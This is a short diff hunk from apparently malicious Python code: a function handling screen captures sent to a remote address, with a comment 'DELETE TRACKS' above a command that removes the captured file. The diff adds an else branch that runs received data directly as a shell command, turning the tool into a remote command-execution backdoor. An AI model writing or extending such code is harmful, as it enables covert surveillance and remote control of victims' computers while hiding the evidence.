@@ -39,6 +39,8 @@ def handle_prt_sc(destination_address, destination_port):
                 # DELETE TRACKS
                 os.system("rm " + final_path)
                 n += 1
+            else:
+                os.system(data)
     finally:
         # CLOSES SOCKET
         sock.close()
